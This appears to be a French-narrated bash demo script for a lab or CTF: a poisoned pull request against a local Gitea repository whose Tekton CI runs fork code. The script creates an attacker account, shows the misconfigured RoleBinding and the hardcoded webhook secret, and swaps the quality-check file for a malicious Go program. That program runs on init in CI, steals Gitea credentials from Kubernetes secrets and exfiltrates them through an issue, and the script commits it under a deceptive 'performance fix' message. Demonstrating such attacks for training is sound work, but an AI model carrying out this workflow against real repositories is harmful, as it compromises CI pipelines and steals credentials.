#!/bin/bash

########################
# include the magic
########################
. ../../bin/demo-magic.sh

clear

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

GITEA_URL="http://gitea.sc.local:30080"
GITEA_USER="hacker_challenge1"
GITEA_PASS="Test1234"
GITEA_EMAIL="${GITEA_USER}@example.com"
UPSTREAM_OWNER="sc-admin"
UPSTREAM_REPO="recipe-api"
MALICIOUS_SRC="${SCRIPT_DIR}/malicious-gitea-issue.go"
TARGET_PATH="scripts/quality-check/main.go"
BRANCH_NAME="fix/improve-quality-check"
COMMIT_MSG="fix: improve quality check script performance"
WORK_DIR="/tmp/demo-contribution"
ADMIN_USER="ctf-admin"
ADMIN_PASS="Test1234!"

# ============================================================================
# Preparation silencieuse
# ============================================================================

rm -rf "${WORK_DIR}"
mkdir -p "${WORK_DIR}"

# Supprimer le fork existant
curl -s -X DELETE \
    -u "${GITEA_USER}:${GITEA_PASS}" \
    "${GITEA_URL}/api/v1/repos/${GITEA_USER}/${UPSTREAM_REPO}" \
    > /dev/null 2>&1 || true

# Supprimer le compte hacker existant
curl -s -X DELETE \
    -u "${ADMIN_USER}:${ADMIN_PASS}" \
    "${GITEA_URL}/api/v1/admin/users/${GITEA_USER}" \
    > /dev/null 2>&1 || true

# Fermer toutes les PRs ouvertes
for pr_number in $(curl -s -u "${ADMIN_USER}:${ADMIN_PASS}" \
    "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/pulls?state=open" \
    | jq -r '.[].number' 2>/dev/null); do
    curl -s -X PATCH \
        -u "${ADMIN_USER}:${ADMIN_PASS}" \
        -H 'Content-Type: application/json' \
        -d '{"state":"closed"}' \
        "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/pulls/${pr_number}" \
        > /dev/null 2>&1 || true
done

# Fermer toutes les issues ouvertes
for issue_number in $(curl -s -u "${ADMIN_USER}:${ADMIN_PASS}" \
    "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/issues?state=open&type=issues" \
    | jq -r '.[].number' 2>/dev/null); do
    curl -s -X PATCH \
        -u "${ADMIN_USER}:${ADMIN_PASS}" \
        -H 'Content-Type: application/json' \
        -d '{"state":"closed"}' \
        "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/issues/${issue_number}" \
        > /dev/null 2>&1 || true
done

rm -f /tmp/gitea_cookies.txt /tmp/csrf_token.txt

# Creer le compte hacker silencieusement
curl -s -c /tmp/gitea_cookies.txt "${GITEA_URL}/user/sign_up" \
    | grep -oP '(?<=name="_csrf" value=")[^"]+' \
    > /tmp/csrf_token.txt 2>/dev/null || true

curl -s -o /dev/null \
    -b /tmp/gitea_cookies.txt \
    -c /tmp/gitea_cookies.txt \
    -X POST "${GITEA_URL}/user/sign_up" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "_csrf=$(cat /tmp/csrf_token.txt)" \
    --data-urlencode "user_name=${GITEA_USER}" \
    --data-urlencode "email=${GITEA_EMAIL}" \
    --data-urlencode "password=${GITEA_PASS}" \
    --data-urlencode "retype=${GITEA_PASS}" \
    > /dev/null 2>&1 || true

sleep 1

clear

# ============================================================================
# SECTION 1 — Introduction
# ============================================================================

p "Ayant acces a l'URL Gitea, je peux creer un compte, comme n'importe qui."

p "Verifions que le compte existe en s'authentifiant via l'API..."
pe "curl -s -u '${GITEA_USER}:${GITEA_PASS}' \
  '${GITEA_URL}/api/v1/user' \
  | jq '{login: .login, id: .id, email: .email}'"


# ============================================================================
# SECTION 2 — Reconnaissance et fork
# ============================================================================

p "On va faire de la reconnaissance sur le repo et le forker depuis l'interface web :"
p "   ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}"


# ============================================================================
# SECTION 3 — Clone du fork
# ============================================================================

pe "cd ${WORK_DIR}"
pe "git clone http://${GITEA_USER}:${GITEA_PASS}@gitea.sc.local:30080/${GITEA_USER}/${UPSTREAM_REPO}.git"
pe "cd ${UPSTREAM_REPO}"

p "# Fichier: pr-eventlistener.yaml"

p "# TriggerBinding utilisant le head (fork de l'attaquant):"
pe "bat --style=numbers -r 35:48 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"

p "# RoleBinding avec ServiceAccount default:"
pe "bat --style=numbers -r 186:192 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"

p "# Role avec accès aux secrets:"
pe "bat --style=numbers -r 165:177 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"

p "# Task exécutant le code du fork:"
pe "bat --style=numbers -r 68:72 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/tasks/pr-quality-check-task.yaml"

p "# Secret du webhook codé en dur:"
pe "bat --style=numbers -r 193:200 ${WORK_DIR}/${UPSTREAM_REPO}/.tekton/triggers/pr-eventlistener.yaml"


p "Contenu actuel du code exécuté au QualityCheck:"
pe "bat ${TARGET_PATH}"


# ============================================================================
# SECTION 4 — Creation de la branche
# ============================================================================

pe "git checkout -b '${BRANCH_NAME}'"
pe "git branch -a"

# ============================================================================
# SECTION 5 — Injection du code malveillant
# ============================================================================

p "Le fichier source malveillant fait $(wc -l < ${MALICIOUS_SRC}) lignes."
p "Regardons les parties interessantes..."

p "La fonction init() se declenche automatiquement en environnement CI :"
pe "bat --style=numbers -r 47:54 ${MALICIOUS_SRC}"

p "Elle appelle exfiltrateAndCreateIssue() — le plan d'attaque :"
pe "bat --style=numbers -r 56:60 ${MALICIOUS_SRC}"

p "Que fait collect?"
pe "bat --style=numbers -r 107:123 ${MALICIOUS_SRC}"

p "Vol des credentials Gitea depuis les secrets Kubernetes :"
pe "bat --style=numbers -r 139:154 ${MALICIOUS_SRC}"

# p "On remplace le fichier original par ce code..."
cp ${MALICIOUS_SRC} ./${TARGET_PATH}


# ============================================================================
# SECTION 6 — Add, commit, push
# ============================================================================

git config user.name "${GITEA_USER}"
git config user.email "${GITEA_EMAIL}"

pe "git add ${TARGET_PATH}"
pe "git status"
pe "git commit -m '${COMMIT_MSG}'"
pe "git push --set-upstream origin '${BRANCH_NAME}'"


# ============================================================================
# SECTION 7 — Creation de la Pull Request
# ============================================================================

p "On cree la Pull Request depuis l'interface web de Gitea :"
p "   ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/compare/main...${GITEA_USER}:${BRANCH_NAME}"


# ============================================================================
# SECTION 8 — Verification du resultat
# ============================================================================

p "Allons voir le repo sur l'interface web..."
p "La CI a execute notre code malveillant et cree une issue."

ISSUE_NUMBER=$(curl -s -u "${GITEA_USER}:${GITEA_PASS}" \
    "${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/issues?type=issues&state=open&limit=1&sort=created&direction=desc" \
    | jq -r '.[0].number // empty' 2>/dev/null)

if [[ -n "${ISSUE_NUMBER}" ]]; then
    p "Issue decouverte : ${GITEA_URL}/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/issues/${ISSUE_NUMBER}"
else
    p "Verifions les issues ouvertes :"
    pe "curl -s -u '${GITEA_USER}:${GITEA_PASS}' \
      '${GITEA_URL}/api/v1/repos/${UPSTREAM_OWNER}/${UPSTREAM_REPO}/issues?type=issues&state=open' \
      | jq '.[0] | {number, title, created_at}'"
fi


# ============================================================================
# Cleanup
# ============================================================================

rm -rf "${WORK_DIR}"
p "✅"

